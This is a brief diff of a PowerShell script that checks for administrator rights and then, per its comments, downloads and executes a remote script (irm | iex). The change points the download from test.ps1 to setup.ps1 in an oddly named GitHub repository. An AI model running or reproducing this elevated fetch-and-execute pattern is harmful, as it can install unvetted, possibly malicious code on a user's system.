@@ -12,7 +12,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 Write-Host "Preparing for download..."
 
 # 2. Define the target URL
-$url = "https://raw.githubusercontent.com/itsverycoolbs/verycoolprogramforsure/main/test.ps1"
+$url = "https://raw.githubusercontent.com/itsverycoolbs/verycoolprogramforsure/main/setup.ps1"
 
 # 3. Download and execute (irm | iex)
 try {
